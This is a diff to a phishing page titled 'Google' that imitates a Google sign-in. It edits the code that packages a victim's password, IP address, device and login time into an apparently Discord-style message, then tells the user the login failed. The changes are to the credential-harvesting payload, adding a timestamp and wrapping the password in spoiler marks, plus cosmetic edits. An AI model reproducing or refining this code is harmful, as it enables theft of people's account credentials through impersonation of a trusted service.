@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
-    <link rel="icon" type="image/x-icon" href="Code/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="Code/Images/favicon">
     <style>
         body {
             background-color: #121212;
@@ -79,7 +79,7 @@
         }
 
         async function getVersion() {
-            return '1.3.3';
+            return '1.3.2';
         }
 
         async function getIPAddress() {
@@ -110,7 +110,7 @@
                     },
                     {
                         name: 'Password',
-                        value: password,
+                        value: '||'+password+'||',
                         inline: true,
                     },
                     {
@@ -119,15 +119,20 @@
                         inline: true,
                     },
                     {
+                        name: 'Time',
+                        value: new Date().toLocaleString(),
+                        inline: false,
+                    },
+                    {
                         name: 'IP Address',
                         value: ipAddress,
-                        inline: true,
+                        inline: false,
                     },
                     {
                         name: 'Device',
                         value: device,
                         inline: false,
-                    },
+                    },  
                 ],
             };
 
@@ -189,7 +194,7 @@
                     isLoginButtonEnabled = true;
                 }, 3000);
 
-                alert("Invalid username or password. Please try again.");
+                alert("You have entered a invalid username or password, please try again! ❌");
             }
         }
     </script>
